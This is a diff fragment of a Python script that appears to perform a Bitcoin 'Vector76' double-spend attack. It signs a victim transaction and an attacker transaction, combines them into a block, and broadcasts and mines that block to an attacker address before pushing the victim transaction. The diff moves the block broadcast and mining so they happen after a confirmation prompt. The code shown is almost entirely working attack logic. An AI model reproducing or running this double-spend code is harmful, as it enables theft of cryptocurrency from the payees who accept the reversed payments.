@@ -125,11 +125,6 @@ else:
 vector76_block = f"{tx_victim}{tx_attacker}"
 vector76_block = transaction_util.sign(vector76_block, 0, fake_send_from)
 
-print(f"Generating Vector76 Block")
-send_rawtransaction(vector76_block)
-for i in range(6):
-    print(f" {i + 1} / 6   ...")
-    generate_block(attacker_address, vector76_block)
 print()
 print("[+] READY...")
 print()
@@ -140,12 +135,18 @@ print(f"Send Amount (Satoshi unit)    : {send_amount} Satoshi")
 print(f"Signed victim   Signed RawTx  : {tx_victim}")
 print(f"Signed attacker Signed RawTx  : {tx_attacker}")
 print(f"Signed vector76 Signed RawTx  : {vector76_block}")
+print(f"Vector76 Block                : {vector76_block}")
 print(f"Testnet Mode              : {testnet}")
 print("--------------------")
 print()
 print()
 input("--- Are you sure you want to continue? Press Enter to continue. ---")
 print()
+print(f"Generating Vector76 Block")
+send_rawtransaction(vector76_block)
+for i in range(6):
+    print(f" {i + 1} / 6   ...")
+    generate_block(attacker_address, vector76_block)
 
 print("Sending V1 Transaction to victim...")
 transaction_util.pushtx(tx_victim)
